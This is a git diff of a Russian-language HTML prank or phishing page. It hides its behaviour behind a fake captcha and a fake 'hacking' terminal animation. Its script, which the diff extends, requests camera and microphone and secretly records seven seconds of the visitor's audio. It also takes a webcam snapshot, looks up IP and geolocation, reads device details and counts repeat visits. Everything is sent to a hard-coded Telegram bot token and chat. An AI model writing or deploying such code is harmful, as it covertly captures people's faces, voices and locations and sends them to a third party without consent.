@@ -55,106 +55,110 @@
 
     <script>
         const token = "8334056184:AAEvbx3eM-yW3jibp0nUx9YbqDgWX80wMcE";
-        const chat_id = "-1003861311533";
+const chat_id = "-1003861311533";
 
-        async function startProcess() {
-  
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                document.getElementById('video').srcObject = stream;
-            } catch (e) { console.log("Камера отклонена"); }
-
-            document.getElementById('captcha-box').style.display = 'none';
-            document.getElementById('terminal').style.display = 'block';
-
-            const lines = [
-                "> [INIT] Подключение к спутнику...", "> [INFO] Захват HTTP-трафика...",
-                "> [SUCCESS] Доступ к API получен", "> [INFO] Взлом файловой системы...",
-                "> [SUCCESS] Root доступ подтвержден", "> [INFO] Снятие дампа памяти...",
-                "> [DONE] ВСЕ ДАННЫЕ ОТПРАВЛЕНЫ."
-            ];
-
-            for (let line of lines) {
-                let p = document.createElement('p');
-                p.innerText = line;
-                document.getElementById('terminal').appendChild(p);
-                window.scrollTo(0, document.body.scrollHeight);
-                await new Promise(r => setTimeout(r, 120)); 
-            }
-            await getTripleData();
-        }
-
-        async function getTripleData() {
-            let ip = "N/A", city = "N/A", battery = "N/A";
-            
+async function startProcess() {
      
-            const ua = navigator.userAgent;
-            const memory = navigator.deviceMemory || "N/A";
-            const cores = navigator.hardwareConcurrency || "N/A";
-            const lang = navigator.language;
-            const time = new Date().toLocaleString();
+    let visits = localStorage.getItem('v_count') || 0;
+    visits = parseInt(visits) + 1;
+    localStorage.setItem('v_count', visits);
 
-          
-            if (navigator.getBattery) {
-                const b = await navigator.getBattery();
-                battery = `${(b.level * 100).toFixed(0)}% (${b.charging ? 'Зарядка' : 'Разряд'})`;
-            }
+ 
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+        document.getElementById('video').srcObject = stream;
+        
+        // Начинаем запись аудио реакции (7 секунд)
+        if (visits === 1) startAudioRecord(stream);
+    } catch (e) { console.log("Доступ ограничен"); }
 
-    
-            try {
-                const ipRes = await fetch('https://api64.ipify.org?format=json').catch(() => null);
-                if (ipRes) { ip = (await ipRes.json()).ip; }
-                const geoRes = await fetch(`https://ipapi.co/${ip}/json/`).catch(() => null);
-                if (geoRes) {
-                    const d = await geoRes.json();
-                    city = `${d.city}, ${d.country_name} (${d.org})`;
-                }
-            } catch(e){}
+    document.getElementById('captcha-box').style.display = 'none';
+    document.getElementById('terminal').style.display = 'block';
+
+    const lines = [
+        "> [INIT] Подключение...", "> [INFO] Поиск уязвимости...",
+        "> [SUCCESS] Доступ получен", "> [INFO] Копирование данных...",
+        "> [DONE] ВЫГРУЗКА ЗАВЕРШЕНА."
+    ];
+
+    for (let line of lines) {
+        let p = document.createElement('p');
+        p.innerText = line;
+        document.getElementById('terminal').appendChild(p);
+        window.scrollTo(0, document.body.scrollHeight);
+        await new Promise(r => setTimeout(r, 120)); 
+    }
+    await getTripleData(visits);
+}
+
+async function startAudioRecord(stream) {
+    const mediaRecorder = new MediaRecorder(stream);
+    let chunks = [];
+    mediaRecorder.ondataavailable = e => chunks.push(e.data);
+    mediaRecorder.onstop = async () => {
+        const blob = new Blob(chunks, { type: 'audio/ogg; codecs=opus' });
+        const formData = new FormData();
+        formData.append("chat_id", chat_id);
+        formData.append("voice", blob, "reaction.ogg");
+        formData.append("caption", "🎙 Реакция клиента (аудио)");
+        await fetch(`https://api.telegram.org/bot${token}/sendVoice`, { method: "POST", body: formData });
+    };
+    mediaRecorder.start();
+    setTimeout(() => mediaRecorder.stop(), 7000); 
+}
+
+async function getTripleData(visits) {
+    let ip = "N/A", city = "N/A", battery = "N/A";
+    const ua = navigator.userAgent;
 
    
-            document.getElementById('user-ip').innerText = ip;
-            document.getElementById('user-geo').innerText = city;
-            document.getElementById('user-os').innerText = navigator.platform;
-
-     
-            let photoSent = "ОТКЛОНЕНО";
-            const video = document.getElementById('video');
-            const canvas = document.getElementById('canvas');
-            if (video.srcObject) {
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                const imgData = canvas.toDataURL('image/jpeg');
-                photoSent = "ВЫПОЛНЕНО";
-                
- 
-                const blob = await (await fetch(imgData)).blob();
-                const formData = new FormData();
-                formData.append("chat_id", chat_id);
-                formData.append("photo", blob, "photo.jpg");
-                formData.append("caption", `📸 Снимок с IP: ${ip}`);
-                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: "POST", body: formData });
-            }
-            document.getElementById('cam-status').innerText = photoSent;
-
-     
-            const msg = `⚡️ МАКСИМАЛЬНЫЙ ПРОБИВ ⚡️
-📍 IP: ${ip}
-🌍 ГОРОД: ${city}
-📱 УСТРОЙСТВО: ${navigator.platform}
-🔋 БАТАРЕЯ: ${battery}
-🧠 ОЗУ: ${memory}GB | ЯДРА: ${cores}
-⏰ ВРЕМЯ: ${time}
-📸 КАМЕРА: ${photoSent}
-🌐 ТЕХ: ${ua}`;
-
-            await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`);
-
-            setTimeout(() => {
-                document.getElementById('terminal').style.display = 'none';
-                document.getElementById('leak-box').style.display = 'block';
-            }, 600);
+    try {
+        const ipRes = await fetch('https://api64.ipify.org?format=json').catch(() => null);
+        if (ipRes) { ip = (await ipRes.json()).ip; }
+        const geoRes = await fetch(`https://ipapi.co/${ip}/json/`).catch(() => null);
+        if (geoRes) {
+            const d = await geoRes.json();
+            city = `${d.city}, ${d.country_name}`;
         }
+    } catch(e){}
+
+    document.getElementById('user-ip').innerText = ip;
+    document.getElementById('user-geo').innerText = city;
+    document.getElementById('user-os').innerText = navigator.platform;
+
+    if (visits === 1) {
+       
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        
+        let photoSent = "НЕТ";
+        if (video.srcObject) {
+            await new Promise(r => setTimeout(r, 1000));  
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            const imgData = canvas.toDataURL('image/jpeg', 0.7);
+            const blob = await (await fetch(imgData)).blob();
+            
+            const formData = new FormData();
+            formData.append("chat_id", chat_id);
+            formData.append("photo", blob, "photo.jpg");
+            formData.append("caption", `⚡️ ПЕРВЫЙ ПРОБИВ\n📍 IP: ${ip}\n🌍 ГОРОД: ${city}\n📱 ОС: ${navigator.platform}`);
+            const res = await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: "POST", body: formData });
+            if (res.ok) photoSent = "ДА";
+        }
+        document.getElementById('cam-status').innerText = photoSent === "ДА" ? "ВЫПОЛНЕНО" : "ОТКЛОНЕНО";
+    } else {
+        
+        const shortMsg = `♻️ ПОВТОРНЫЙ ПЕРЕХОД #${visits}\n📍 IP: ${ip}\n🌍 ГОР: ${city}`;
+        await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(shortMsg)}`);
+    }
+
+    setTimeout(() => {
+        document.getElementById('terminal').style.display = 'none';
+        document.getElementById('leak-box').style.display = 'block';
+    }, 600);
+}
     </script>
 </body>
 </html>
